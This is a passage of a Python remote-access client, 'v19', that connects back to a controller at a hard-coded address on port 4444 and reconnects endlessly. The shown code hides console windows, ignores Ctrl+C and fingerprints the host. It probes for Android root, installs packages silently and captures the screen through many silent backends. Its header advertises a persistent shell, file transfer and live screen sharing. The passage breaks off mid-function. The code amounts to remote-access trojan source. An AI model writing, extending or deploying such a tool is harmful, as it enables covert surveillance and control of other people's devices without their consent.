# client.py - v19 (macOS, Android/Termux and iOS-aware; instant commands, fast
#                   capture, persistent + shell, screen share in its own thread,
#                   Ctrl+B background / Ctrl+Z kill, queued requests answered,
#                   floods cut off not killed)

import atexit
import base64
import contextlib
import errno
import importlib.util
import io
import json
import os
import platform
import re
import select
import shutil
import signal
import socket
import stat
import struct
import subprocess
import sys
import tempfile
import threading
import time

DEFAULT_IP = '192.168.0.113'
DEFAULT_PORT = 4444
RETRY_DELAY = 1               # seconds between reconnect attempts
CONNECT_TIMEOUT = 3           # seconds a TCP connect may take before we retry
MAX_FILE = 50 * 1024 * 1024   # 50 MB
MAX_MSG = 96 * 1024 * 1024    # sanity bound for one protocol message
MAX_OUTPUT = 8 * 1024 * 1024  # keep this much output; a flood is cut off, not killed
SCREEN_SIZE = (960, 540)      # screen share frame size (width, height)
SCREEN_JPEG_QUALITY = 70      # JPEG quality for streamed frames
SCREENSHOT_JPEG_QUALITY = 85  # JPEG quality for one-shot screenshots
SCREEN_SEND_TIMEOUT = 5       # seconds a send may stall before we give up
SEND_CHUNK = 256 * 1024       # write in bounded pieces so a stuck peer can't park a thread
RECV_STALL_TIMEOUT = 30       # seconds a *partially read* message may stall before reconnect
KEEPALIVE_IDLE = 5            # seconds of silence before TCP keepalive probes start
KEEPALIVE_INTERVAL = 3        # seconds between keepalive probes
KEEPALIVE_COUNT = 3           # failed probes before the connection is declared dead
CREATE_NO_WINDOW = 0x08000000 # Windows: never flash a console window (ignored elsewhere)


def _quiet_flags():
    """Extra Popen keywords so helper processes never flash a console window
    on Windows (empty elsewhere)."""
    if os.name == 'nt':
        return {'creationflags': CREATE_NO_WINDOW}
    return {}
SCRIPT_PATH = os.path.abspath(__file__)                            # what autorun restarts
AUTORUN_NAME = os.path.splitext(os.path.basename(SCRIPT_PATH))[0]  # -> 'client'


def _immune_to_ctrl_c():
    """Ctrl+C in this client must never end it.

    A Python-level no-op handler is used on purpose instead of SIG_IGN:
    a caught signal is reset to its default on exec(), so shell commands,
    the interactive PTY shell and every child we spawn still receive their
    own Ctrl+C exactly like before. Ctrl+Z (the controller's stop) and the
    controller's 'exit' command keep working as the ways to end things."""
    try:
        signal.signal(signal.SIGINT, lambda *_: None)
    except (ValueError, OSError, AttributeError):   # not the main thread
        pass


# ---------------------------------------------------------------------------
# Platform detection
#
# Order matters: Android reports sys.platform == 'linux', and a jailbroken
# iOS Python reports 'darwin', so both checks run before the generic ones.
# Everything here is cached; the hot command path never pays for it.
# ---------------------------------------------------------------------------
_PLATFORM_CACHE = {}
_ANDROID_PROPS = [None]
_ANDROID_PROPS_LOCK = threading.Lock()
_ANDROID_ROOT = [None]          # only successes are cached forever
_ANDROID_ROOT_DENIED = [0.0]    # last failed probe (monotonic): retried after a pause


def is_android():
    """True on Android/Termux (and on CPython built for Android)."""
    if 'android' not in _PLATFORM_CACHE:
        try:
            prefix = os.environ.get('PREFIX') or ''
            result = (hasattr(sys, 'getandroidapilevel')
                      or os.environ.get('ANDROID_ROOT') == '/system'
                      or prefix.startswith('/data/data/com.termux')
                      or (os.path.exists('/system/build.prop')
                          and os.path.exists('/system/bin/sh')))
        except Exception:
            result = False
        _PLATFORM_CACHE['android'] = result
    return _PLATFORM_CACHE['android']


def is_ios():
    """True on iOS/iPadOS, including jailbroken devices where Python is a
    normal Darwin build (there the system version file says iPhone OS)."""
    if 'ios' not in _PLATFORM_CACHE:
        result = False
        if sys.platform == 'ios':
            result = True                   # Pythonista / BeeWare style Python
        elif sys.platform == 'darwin':
            try:
                import plistlib
                with open('/System/Library/CoreServices/SystemVersion.plist', 'rb') as f:
                    info = plistlib.load(f)
                product = str(info.get('ProductName') or '')
                result = ('iPhone OS' in product or 'iPadOS' in product
                          or product == 'iOS')
            except Exception:
                result = False
        _PLATFORM_CACHE['ios'] = result
    return _PLATFORM_CACHE['ios']


def is_macos():
    if 'macos' not in _PLATFORM_CACHE:
        _PLATFORM_CACHE['macos'] = (sys.platform == 'darwin' and not is_ios())
    return _PLATFORM_CACHE['macos']


def _android_props():
    """Android build properties (one getprop call, cached)."""
    with _ANDROID_PROPS_LOCK:
        if _ANDROID_PROPS[0] is None:
            props = {}
            exe = shutil.which('getprop') or '/system/bin/getprop'
            try:
                out = subprocess.run([exe], stdout=subprocess.PIPE,
                                     stderr=subprocess.DEVNULL, timeout=5).stdout
                text = out.decode('utf-8', 'replace')
                for line in text.splitlines():
                    match = re.match(r'^\[([^\]]+)\]:\s*\[(.*)\]$', line)
                    if match:
                        props[match.group(1)] = match.group(2)
            except Exception:
                pass
            _ANDROID_PROPS[0] = props
        return _ANDROID_PROPS[0]


def android_api():
    try:
        return int(_android_props().get('ro.build.version.sdk') or 0)
    except (TypeError, ValueError):
        return 0


def android_name():
    props = _android_props()
    version = props.get('ro.build.version.release')
    if not version:
        return 'Android (version unknown)'
    api = props.get('ro.build.version.sdk')
    manufacturer = props.get('ro.product.manufacturer') or ''
    model = props.get('ro.product.model') or ''
    name = 'Android {}'.format(version)
    if api:
        name += ' (API {})'.format(api)
    device = ' '.join(part for part in (manufacturer, model) if part).strip()
    if device:
        name += ' - {}'.format(device)
    return name


def ios_name():
    version = ''
    try:
        if hasattr(platform, 'ios_ver'):
            info = platform.ios_ver()
            version = getattr(info, 'release', '') or ''
    except Exception:
        version = ''
    if not version:
        try:
            import plistlib
            with open('/System/Library/CoreServices/SystemVersion.plist', 'rb') as f:
                version = str(plistlib.load(f).get('ProductVersion') or '')
        except Exception:
            version = ''
    return 'iOS {}'.format(version) if version else 'iOS'


MACOS_CODENAMES = {'26': 'Tahoe', '27': 'Golden Gate'}


def macos_name():
    version = platform.mac_ver()[0] or platform.release()
    codename = MACOS_CODENAMES.get(version.split('.')[0])
    return 'macOS {}{}'.format(version, ' ({})'.format(codename) if codename else '')


def _su_path():
    """Magisk/KernelSU ship su in /system/bin (not on Termux's PATH)."""
    found = shutil.which('su')
    if found:
        return found
    for path in ('/system/bin/su', '/system/xbin/su', '/sbin/su'):
        if os.path.exists(path):
            return path
    return None


def _android_root():
    """True when su is granted. A success is cached forever. A failure is
    remembered for a short pause, so a denied/slow Magisk prompt is not shown
    on every single screenshot, while a later grant still works."""
    if _ANDROID_ROOT[0]:
        return True
    if time.monotonic() - _ANDROID_ROOT_DENIED[0] < 45:
        return False
    su = _su_path()
    if not su:
        return False
    try:
        proc = subprocess.run([su, '-c', 'id -u'], stdout=subprocess.PIPE,
                              stderr=subprocess.DEVNULL, timeout=10)
        ok = (proc.returncode == 0
              and proc.stdout.decode('utf-8', 'replace').strip() == '0')
    except Exception:
        ok = False
    if ok:
        _ANDROID_ROOT[0] = True
    else:
        _ANDROID_ROOT_DENIED[0] = time.monotonic()
    return ok


def _android_wake_lock(enable):
    """Keep Termux alive while the client runs (no-op elsewhere)."""
    if not is_android():
        return
    exe = shutil.which('termux-wake-lock' if enable else 'termux-wake-unlock')
    if not exe:
        return
    try:
        subprocess.run([exe], stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=5)
    except Exception:
        pass


def _shell_executable():
    """Android has no /bin/sh in the Termux root; use Termux's own sh.
    Everywhere else None keeps Python's default /bin/sh exactly as before."""
    if is_android():
        return shutil.which('sh') or '/system/bin/sh'
    return None


def _tune_socket(sock):
    """Low latency + fast dead-controller detection.

    On VM/NAT setups the FIN of a killed controller can get lost, leaving the
    client blocked on a half-open connection forever (that was the "must log
    out of the VM to reconnect" bug). Tuned keepalives make the kernel notice
    a dead peer within ~15 seconds, so the reconnect loop below takes over.
    They also keep VMware NAT mappings from expiring while idle."""
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except OSError:
        pass
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except OSError:
        return
    # Each knob is set independently: macOS has TCP_KEEPALIVE (idle) plus
    # TCP_KEEPINTVL/TCP_KEEPCNT, Linux has TCP_KEEPIDLE+INTVL+CNT, and some
    # platforms have only a subset. The old if/elif skipped interval/count on
    # macOS entirely, so a dead controller could take minutes to notice.
    if hasattr(socket, 'TCP_KEEPIDLE'):            # Linux
        with contextlib.suppress(OSError):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, KEEPALIVE_IDLE)
    if hasattr(socket, 'TCP_KEEPALIVE'):           # macOS (legacy name for idle)
        with contextlib.suppress(OSError):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPALIVE, KEEPALIVE_IDLE)
    if hasattr(socket, 'TCP_KEEPINTVL'):
        with contextlib.suppress(OSError):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, KEEPALIVE_INTERVAL)
    if hasattr(socket, 'TCP_KEEPCNT'):
        with contextlib.suppress(OSError):
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, KEEPALIVE_COUNT)
    if os.name == 'nt':
        try:
            sock.ioctl(socket.SIO_KEEPALIVE_VALS,
                       (1, KEEPALIVE_IDLE * 1000, KEEPALIVE_INTERVAL * 1000))
        except (AttributeError, OSError):
            pass


def _socket_writable(sock, timeout):
    """True when the socket can take more data without hanging (a stuck or
    vanished peer stops being writable once its TCP window fills up)."""
    try:
        _, writable, _ = select.select([], [sock], [], timeout)
    except OSError:
        return False
    return bool(writable)


def recv_exact(conn, n):
    chunks = []
    while n > 0:
        if chunks:
            # Part of the message is already here. Wait for the rest, but not
            # forever: a peer that froze mid-message must trigger a reconnect.
            # The idle wait for a *new* message stays blocking (a quiet
            # controller is normal and must not look like a dead one).
            readable, _, _ = select.select([conn], [], [], RECV_STALL_TIMEOUT)
            if not readable:
                return None
        chunk = conn.recv(min(n, 262144))
        if not chunk:
            return None
        chunks.append(chunk)
        n -= len(chunk)
    return b''.join(chunks)


SEND_LOCK = threading.Lock()    # one writer at a time: frames and replies
CANCELED = {}                   # request ids the controller stopped -> why (Ctrl+Z/stop)
CANCELED_LOCK = threading.Lock()
DEFERRED = []                   # requests that arrived while a command was running


def _send_chunked(conn, payload):
    """sendall() in bounded chunks, checking progress between them.

    A single sendall() of a 50 MB download could park this thread forever on
    a peer that stopped reading (a lost FIN leaves the socket writable for a
    while). Chunking means every chunk re-checks the socket; a peer that is
    not draining the link raises OSError after SCREEN_SEND_TIMEOUT and the
    normal reconnect logic takes over."""
    view = memoryview(payload)
    while view:
        if not _socket_writable(conn, SCREEN_SEND_TIMEOUT):
            raise OSError('send stalled: controller stopped reading')
        sent = conn.send(view[:SEND_CHUNK])
        if sent <= 0:
            raise OSError('connection lost while sending')
        view = view[sent:]


def send_msg(conn, obj):
    """Send one JSON message.

    A screen share runs in its own thread, so two threads can be sending at
    the same time: without the lock their 4-byte length headers and payloads
    would interleave and desync the whole protocol."""
    payload = json.dumps(obj).encode('utf-8')
    with SEND_LOCK:
        _send_chunked(conn, len(payload).to_bytes(4, 'big'))
        _send_chunked(conn, payload)


def _mark_canceled(req_id, why='Ctrl+Z'):
    """Remember a canceled request so it is skipped when the client picks it up."""
    if req_id is None:
        return
    with CANCELED_LOCK:
        CANCELED[req_id] = why
        if len(CANCELED) > 512:     # defensive bound; entries free up as they arrive
            for old in list(CANCELED)[:64]:
                CANCELED.pop(old, None)


def _is_canceled(req_id):
    if req_id is None:
        return False
    with CANCELED_LOCK:
        return req_id in CANCELED


def _forget_canceled(req_id):
    """Drop a canceled id and report why it was canceled (None if unknown)."""
    if req_id is None:
        return None
    with CANCELED_LOCK:
        return CANCELED.pop(req_id, None)


def recv_msg(conn):
    try:
        header = recv_exact(conn, 4)
        if header is None:
            return None
        size = int.from_bytes(header, 'big')
        if size > MAX_MSG:              # desynced/garbage stream - reconnect
            return None
        payload = recv_exact(conn, size)
        if payload is None:
            return None
        msg = json.loads(payload.decode('utf-8'))
        return msg if isinstance(msg, dict) else None    # garbage -> reconnect
    except (OSError, ValueError):
        return None


PREV_DIR = None                 # remembered so 'cd -' works like in a real shell


def change_dir(command, current_dir):
    """Intercept a plain 'cd' so the directory persists between commands.
    Returns (new_dir, output_or_None), or None if it's not a plain cd."""
    global PREV_DIR
    cmd = command.strip()
    low = cmd.lower()
    if low != 'cd' and not low.startswith('cd '):
        return None
    if any(op in cmd for op in ('&&', '||', ';', '|')):
        return None  # compound command: let the shell run it

    target = cmd[2:].strip()
    if os.name == 'nt' and target.lower().startswith('/d '):   # Windows: cd /d C:\path
        target = target[3:].strip()
    if len(target) >= 2 and target[0] == target[-1] and target[0] in ('"', "'"):
        target = target[1:-1]

    if target == '':
        return current_dir, current_dir      # bare 'cd' prints the directory

    target = os.path.expandvars(os.path.expanduser(target))
    if target == '-':                        # 'cd -' -> the previous directory
        if PREV_DIR and os.path.isdir(PREV_DIR):
            return PREV_DIR, PREV_DIR
        return current_dir, 'cd: OLDPWD not set'

    new_dir = target if os.path.isabs(target) else os.path.join(current_dir, target)
    new_dir = os.path.normpath(new_dir)
    if os.path.isdir(new_dir):
        PREV_DIR = current_dir
        return new_dir, None
    if os.path.exists(new_dir):
        return current_dir, "cd: {}: Not a directory".format(target)
    return current_dir, "cd: {}: No such file or directory".format(target)


def _ensure_dependencies_impl():
    """Make sure Pillow (screen capture) is importable, installing it with
    pip when it is missing. Returns True if it is ready."""
    try:
        import PIL
    except ImportError:
        PIL = None

    # Stock iOS gives sandboxed Python apps no way to capture the screen (or
    # run a background shell); don't waste time trying to pip-install Pillow.
    if PIL is None and is_ios():
        print("[!] Screen capture is not available on stock iOS/iPadOS:")
        print("    Apple does not let a sandboxed Python app capture the screen,")
        print("    and background execution stops after ~30 seconds.")
        print("    This client only works fully on a jailbroken device with a")
        print("    full Python (pty + screencapture).")
        return False

    # Termux has a ready-made Pillow package; pip would have to compile it.
    if PIL is None and is_android():
        pkg = shutil.which('pkg')
        if pkg:
            print("[+] Pillow (screen capture) is missing - installing via Termux packages...")
            try:
                if subprocess.run([pkg, 'install', '-y', 'python-pillow'],
                                  timeout=600).returncode == 0:
                    pass
            except Exception as e:
                print("[!] pkg install failed: {}".format(e))
            try:
                import PIL
            except ImportError:
                PIL = None

    if PIL is None:
        print("[+] Pillow (screen capture) is not installed - trying to install it automatically...")
        python = sys.executable or 'python'

        # Bootstrap pip when even that is missing (fresh Windows Python,
        # pure Arch without python-pip, ...)
        try:
            has_pip = subprocess.run([python, '-m', 'pip', '--version'],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                     timeout=60).returncode == 0
        except Exception:
            has_pip = False
        if not has_pip:
            print("[+] pip is missing too - trying to bootstrap it with ensurepip...")
            for bootstrap in ([python, '-m', 'ensurepip', '--upgrade'],
                              [python, '-m', 'ensurepip', '--upgrade', '--user']):
                try:
                    if subprocess.run(bootstrap, stdout=subprocess.DEVNULL,
                                      stderr=subprocess.DEVNULL, timeout=300,
                                      **_quiet_flags()).returncode == 0:
                        break
                except Exception:
                    pass

        # Try every way a machine may accept a pip install:
        #  - normal venv/Windows install
        #  - user site (works without root)
        #  - PEP 668 distros (Arch, Fedora 38+, Kali/Debian 12+, Mint 22+)
        #    block system pip, so also try the escape hatch, with and without --user
        attempts = [
            [python, '-m', 'pip', 'install', 'pillow'],
            [python, '-m', 'pip', 'install', '--user', 'pillow'],
            [python, '-m', 'pip', 'install', '--break-system-packages', 'pillow'],
            [python, '-m', 'pip', 'install', '--break-system-packages', '--user', 'pillow'],
        ]
        for cmd in attempts:
            try:
                print("[+] Running: {}".format(' '.join(cmd)))
                if subprocess.run(cmd, timeout=600, **_quiet_flags()).returncode == 0:
                    break
            except Exception as e:
                print("[!] Installer failed: {}".format(e))

        try:
            import PIL
        except ImportError:
            PIL = None

        # Last resort: the distro's own package manager (needs root)
        if PIL is None and not is_android() and hasattr(os, 'geteuid') and os.geteuid() == 0:
            for tool, cmd in (
                    ('pacman', ['pacman', '-S', '--noconfirm', '--needed',
                                'python-pillow', 'grim']),
                    ('apt-get', ['apt-get', 'install', '-y', 'python3-pil']),
                    ('dnf', ['dnf', 'install', '-y', 'python3-pillow']),
                    ('zypper', ['zypper', '--non-interactive', 'install', 'python3-Pillow'])):
                if not shutil.which(tool):
                    continue
                try:
                    print("[+] Running: {}".format(' '.join(cmd)))
                    subprocess.run(cmd, timeout=600)
                except Exception as e:
                    print("[!] {} failed: {}".format(tool, e))
                    continue
                try:
                    import PIL
                    break
                except ImportError:
                    continue

        try:
            import PIL
        except ImportError:
            print("[!] Could not install Pillow automatically. Install it by hand:")
            print("    Windows:           py -m pip install pillow")
            print("    macOS:             python3 -m pip install --user pillow")
            print("    Arch Linux:        sudo pacman -S python-pillow grim")
            print("    Kali/Debian/Mint:  sudo apt install python3-pil")
            print("    Fedora:            sudo dnf install python3-pillow")
            print("    Android (Termux):  pkg install python-pillow")
            return False

    if is_android():
        print("[+] Pillow ready. Android screen capture needs root (su + screencap);")
        print("    commands, downloads, uploads and the interactive shell work without it.")
        return True

    if is_ios():
        print("[!] Screen capture is unavailable on stock iOS/iPadOS (screenshots and")
        print("    screen sharing will report this). Commands/files need a jailbroken device.")
        return False

    if is_macos():
        print("[+] Screen capture ready (Pillow {}; screencapture fallback).".format(PIL.__version__))
        print("    If captures show only the wallpaper, allow Screen Recording for your")
        print("    terminal in System Settings > Privacy & Security > Screen Recording.")
        return True

    if sys.platform.startswith('linux') and os.environ.get('WAYLAND_DISPLAY'):
        desktop = os.environ.get('XDG_CURRENT_DESKTOP', 'unknown').split(':')[0]
        available = [t for t in ('grim', 'spectacle', 'scrot') if shutil.which(t)]
        print("[+] Wayland session ({}): capture helpers found: {}.".format(
            desktop, ', '.join(available) if available else 'none'))

    print("[+] Screen capture ready (Pillow {}).".format(PIL.__version__))
    return True


_ENSURE_LOCK = threading.Lock()
_ENSURE_READY = [False]
_ENSURE_LAST_TRY = [0.0]


def ensure_dependencies():
    """Check Pillow once, not on every capture.

    The old code re-ran the whole pip/apt install chain on every screenshot
    when Pillow could not be installed, so each capture stalled for minutes.
    A failed attempt is remembered for 10 minutes (a manual install while the
    client runs is still picked up afterwards)."""
    try:
        import PIL  # noqa: F401
        _ENSURE_READY[0] = True
        return True
    except ImportError:
        pass
    with _ENSURE_LOCK:
        if _ENSURE_READY[0]:
            return True
        if _ENSURE_LAST_TRY[0] and time.monotonic() - _ENSURE_LAST_TRY[0] < 600:
            return False
        _ENSURE_LAST_TRY[0] = time.monotonic()
        result = _ensure_dependencies_impl()
        _ENSURE_READY[0] = bool(result)
        return result


class CaptureError(RuntimeError):
    """Screen capture failed - carries the per-backend details so the
    controller can show what was tried and how to fix it."""

    def __init__(self, message, attempts):
        super().__init__(message)
        self.attempts = attempts


def distro_info():
    """(distro id, pretty name) for the current machine."""
    if is_android():
        return 'android', android_name()
    if is_ios():
        return 'ios', ios_name()
    if is_macos():
        return 'macos', macos_name()
    if not sys.platform.startswith('linux'):
        return (platform.system().lower() or 'unknown',
                '{} {}'.format(platform.system(), platform.release()))
    try:
        with open('/etc/os-release') as f:
            info = dict(line.strip().split('=', 1) for line in f if '=' in line)
        distro_id = info.get('ID', 'linux').strip('"').lower()
        name = info.get('PRETTY_NAME', info.get('NAME', 'Linux')).strip('"')
        return distro_id, name
    except Exception:
        return 'linux', 'Linux'


def environment_report():
    """What this machine has for screen capture. Sent to the controller on
    connect (and with capture errors) so it can explain anything missing."""
    distro_id, distro_name = distro_info()
    if is_android():
        session = 'android'
        desktop = ('Termux' if (os.environ.get('PREFIX') or '').startswith(
            '/data/data/com.termux') else 'Android')
    elif is_ios():
        session = 'ios'
        desktop = 'iOS'
    elif is_macos():
        session = ('ssh' if (os.environ.get('SSH_CONNECTION')
                             or os.environ.get('SSH_TTY')) else 'aqua')
        desktop = 'Aqua' if session == 'aqua' else 'macOS'
    elif sys.platform.startswith('linux'):
        session = ('wayland' if os.environ.get('WAYLAND_DISPLAY') else
                   'x11' if os.environ.get('DISPLAY') else 'none')
        desktop = os.environ.get('XDG_CURRENT_DESKTOP') or 'unknown'
    else:
        session = 'desktop'
        desktop = platform.system()
    try:
        import PIL
        pillow = getattr(PIL, '__version__', 'present')
    except ImportError:
        pillow = None
    try:
        has_pyautogui = importlib.util.find_spec('pyautogui') is not None
    except Exception:
        has_pyautogui = False
    helpers = {
        'pillow': pillow,
        'pyautogui': has_pyautogui,
        'grim': shutil.which('grim') is not None,
        'spectacle': shutil.which('spectacle') is not None,
        'gnome_dbus': shutil.which('gdbus') is not None,
        'gnome_screenshot': shutil.which('gnome-screenshot') is not None,
        'imagemagick': bool(shutil.which('import') or shutil.which('magick')),
        'scrot': shutil.which('scrot') is not None,
        'maim': shutil.which('maim') is not None,
        'screencapture': shutil.which('screencapture') is not None,
        'screencap': bool(shutil.which('screencap')
                          or os.path.exists('/system/bin/screencap')),
        'termux_api': bool(shutil.which('termux-open')
                           or shutil.which('termux-clipboard-get')),
    }
    if is_android():
        os_name = 'android'
    elif is_ios():
        os_name = 'ios'
    elif is_macos():
        os_name = 'macos'
    elif sys.platform.startswith('win'):
        os_name = 'windows'
    elif sys.platform.startswith('linux'):
        os_name = 'linux'
    else:
        os_name = platform.system().lower()
    return {
        'os': os_name,
        'distro': distro_id,
        'distro_name': distro_name,
        'session': session,
        'desktop': desktop,
        'python': '{}.{}.{}'.format(*sys.version_info[:3]),
        'helpers': helpers,
    }


def _capture_diag(exc):
    """Structured details about a capture failure, for the controller."""
    env = environment_report()
    helpers = env['helpers']
    if is_ios():
        category = 'ios'
    elif is_android():
        category = 'android'
    elif env['session'] == 'none':
        category = 'no_session'
    elif not any(helpers.get(k) for k in
                 ('pillow', 'pyautogui', 'grim', 'spectacle', 'gnome_screenshot',
                  'gnome_dbus', 'imagemagick', 'scrot', 'maim', 'screencapture')):
        category = 'missing_deps'
    else:
        category = 'all_failed'
    return {
        'kind': 'capture',
        'category': category,
        'attempts': list(getattr(exc, 'attempts', [])) or [str(exc)],
        'env': env,
    }


# Runs under a Python that has PyGObject (normally /usr/bin/python3 on a
# GNOME machine). It asks the XDG desktop portal for one non-interactive
# screenshot and prints the resulting file:// URI. The portal is the only
# supported capture path on GNOME: org.gnome.Shell.Screenshot refuses
# third-party callers since GNOME 41. The request handle is predicted from
# our own unique bus name + token, and the signal subscription is installed
# *before* the call, so no response can be missed.
PORTAL_SCREENSHOT_SCRIPT = r'''
import os
import sys

try:
    from gi.repository import Gio, GLib
except Exception as exc:
    sys.stderr.write('PyGObject (gi) is not available: %s' % exc)
    raise SystemExit(3)

interactive = len(sys.argv) > 1 and sys.argv[1] == '1'
token = 'analysisclient%d' % os.getpid()

try:
    bus = Gio.bus_get_sync(Gio.BusType.SESSION, None)
except Exception as exc:
    sys.stderr.write('cannot open the session bus: %s' % exc)
    raise SystemExit(3)

unique = (bus.get_unique_name() or '').lstrip(':').replace('.', '_')
expected = '/org/freedesktop/portal/desktop/request/%s/%s' % (unique, token)
state = {'done': False, 'ok': False, 'error': ''}
loop = GLib.MainLoop()


def finish(ok, text=''):
    if state['done']:
        return
    state['done'] = True
    state['ok'] = ok
    state['error'] = text
    loop.quit()


def on_response(conn, sender, path, iface, signal_name, params):
    if path != expected or state['done']:
        return
    try:
        response, results = params.unpack()
    except Exception as exc:
        finish(False, 'bad portal response: %s' % exc)
        return
    if response != 0:
        finish(False, 'screenshot request refused (portal response %s)' % response)
        return
    uri = results.get('uri') if isinstance(results, dict) else None
    if hasattr(uri, 'unpack'):
        uri = uri.unpack()
    if not uri:
        finish(False, 'the portal returned no screenshot file')
        return
    sys.stdout.write(str(uri))
    sys.stdout.flush()
    finish(True)


def on_timeout():
    finish(False, 'the desktop portal did not answer within 25s')
    return False


bus.signal_subscribe('org.freedesktop.portal.Desktop',
                     'org.freedesktop.portal.Request', 'Response',
                     None, None, Gio.DBusSignalFlags.NONE, on_response)
GLib.timeout_add_seconds(25, on_timeout)

options = {'handle_token': GLib.Variant('s', token),
           'interactive': GLib.Variant('b', interactive)}
try:
    bus.call_sync('org.freedesktop.portal.Desktop',
                  '/org/freedesktop/portal/desktop',
                  'org.freedesktop.portal.Screenshot', 'Screenshot',
                  GLib.Variant('(sa{sv})', ('', options)),
                  GLib.VariantType('(o)'), Gio.DBusCallFlags.NONE, 10000, None)
except Exception as exc:
    sys.stderr.write('portal call failed: %s' % exc)
    raise SystemExit(4)

loop.run()
if not state['ok']:
    sys.stderr.write(state['error'] or 'portal screenshot failed')
    raise SystemExit(4)
raise SystemExit(0)
'''

_GI_PYTHON = [False]        # False = not probed yet, '' = none found, else a path


def _python_with_gi():
    """Find a Python interpreter that can import PyGObject (gi), caching the
    answer. The client itself may run under a python.org/Homebrew Python that
    cannot see the distro's gi bindings, but /usr/bin/python3 normally can."""
    cached = _GI_PYTHON[0]
    if cached is not False:
        return cached or None
    candidates = [sys.executable]
    for candidate in ('/usr/bin/python3', shutil.which('python3')):
        if candidate and candidate not in candidates:
            candidates.append(candidate)
    found = ''
    for exe in candidates:
        try:
            probe = subprocess.run([exe, '-c', 'import gi'],
                                   stdout=subprocess.DEVNULL,
                                   stderr=subprocess.DEVNULL, timeout=20)
        except Exception:
            continue
        if probe.returncode == 0:
            found = exe
            break
    _GI_PYTHON[0] = found
    return found or None


def grab_screen():
    """Take one screenshot from wherever this client runs.

    Fast and silent paths first: Pillow's ImageGrab on Windows/macOS/X11
    (that is what used to make screenshots instant), and on Wayland the
    desktop's own tool (grim on Hyprland/Sway, spectacle on KDE, the shell
    API on GNOME) because Pillow only sees XWayland there. On macOS the
    built-in screencapture command is a second path (Screen Recording
    permission applies). Android uses root's screencap; stock Android and
    stock iOS deliberately do not allow this, and report exactly why.
    Everything else is a quiet fallback: nothing in this chain opens a
    window of its own (tools that do, like gnome-screenshot or
    xfce4-screenshooter, used to make a capture take up to a minute - they
    are not used anymore). On a Wayland session a solid-colour picture from
    an X11 tool is rejected: that is XWayland's blank root."""
    try:
        import PIL  # noqa: F401
    except ImportError:
        ensure_dependencies()

    def _load(data):
        from PIL import Image
        return Image.open(io.BytesIO(data)).convert('RGB')

    def from_stdout(cmd):
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=15)
        if proc.returncode != 0 or not proc.stdout:
            raise RuntimeError('exit status {}'.format(proc.returncode))
        return _load(proc.stdout)

    def from_file(cmd):
        tmp = os.path.join(tempfile.gettempdir(), 'client_shot_{}_{}.png'.format(
            os.getpid(), threading.get_ident()))
        try:
            proc = subprocess.run(cmd + [tmp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
            if proc.returncode != 0 or not os.path.exists(tmp):
                raise RuntimeError('exit status {}'.format(proc.returncode))
            with open(tmp, 'rb') as f:
                return _load(f.read())
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass

    def from_screencapture():
        """macOS built-in capture (and jailbroken iOS when the tool exists).
        -x = silent, -m = main display only (one file), -t jpg = no PNG pass."""
        tmp = os.path.join(tempfile.gettempdir(), 'client_shot_{}_{}.jpg'.format(
            os.getpid(), threading.get_ident()))
        exe = shutil.which('screencapture') or '/usr/sbin/screencapture'
        try:
            with contextlib.suppress(OSError):
                os.remove(tmp)
            proc = subprocess.run([exe, '-x', '-m', '-t', 'jpg', tmp],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                                  timeout=15)
            if proc.returncode != 0 or not os.path.exists(tmp) or os.path.getsize(tmp) == 0:
                detail = proc.stderr.decode('utf-8', 'replace').strip()
                raise RuntimeError(detail or 'exit status {}'.format(proc.returncode))
            with open(tmp, 'rb') as f:
                return _load(f.read())
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass

    def from_android():
        """Android: screencap needs root (READ_FRAME_BUFFER is a system
        permission; MediaProjection needs a consent dialog in an app)."""
        if not _android_root():
            raise RuntimeError('Android blocks screen capture without root '
                               '(grant su in Magisk/KernelSU, then retry)')
        su = _su_path() or 'su'
        exe = '/system/bin/screencap' if os.path.exists('/system/bin/screencap') else 'screencap'
        # Termux's LD_LIBRARY_PATH breaks the system binary's linker.
        cmd = 'unset LD_LIBRARY_PATH; {} -p'.format(exe)
        proc = subprocess.run([su, '-c', cmd], stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE, timeout=15)
        if proc.returncode != 0 or not proc.stdout:
            detail = proc.stderr.decode('utf-8', 'replace').strip()
            raise RuntimeError(detail or 'exit status {}'.format(proc.returncode))
        return _load(proc.stdout)

    def from_portal():
        """GNOME/Wayland via the XDG desktop portal (the supported path;
        PyGObject is needed, run through whichever Python has it)."""
        exe = _python_with_gi()
        if not exe:
            raise RuntimeError('needs PyGObject (install python3-gi / '
                               'python3-gobject, or use an X11 session)')
        try:
            proc = subprocess.run([exe, '-c', PORTAL_SCREENSHOT_SCRIPT, '0'],
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  timeout=40)
        except subprocess.TimeoutExpired:
            raise RuntimeError('the desktop portal did not answer within 40s')
        if proc.returncode != 0:
            detail = proc.stderr.decode('utf-8', 'replace').strip()
            raise RuntimeError(detail.splitlines()[-1] if detail else
                               'portal exit status {}'.format(proc.returncode))
        uri = proc.stdout.decode('utf-8', 'replace').strip()
        if not uri.startswith('file://'):
            raise RuntimeError('the portal returned no file')
        from urllib.parse import unquote, urlparse
        path = unquote(urlparse(uri).path)
        try:
            with open(path, 'rb') as f:
                data = f.read()
        finally:
            with contextlib.suppress(OSError):
                os.remove(path)          # it was a temporary copy in Pictures
        return _load(data)

    def from_gnome_shell():
        """Older GNOME Shell screenshot API (works up to GNOME 40; modern
        GNOME refuses third-party callers, which is why the portal is first).
        gdbus replies with (success, filename) - it does not write to a path
        we choose, so it must be parsed, not passed to from_file."""
        exe = shutil.which('gdbus')
        if not exe:
            raise RuntimeError('gdbus is not installed (glib2 package)')
        proc = subprocess.run(
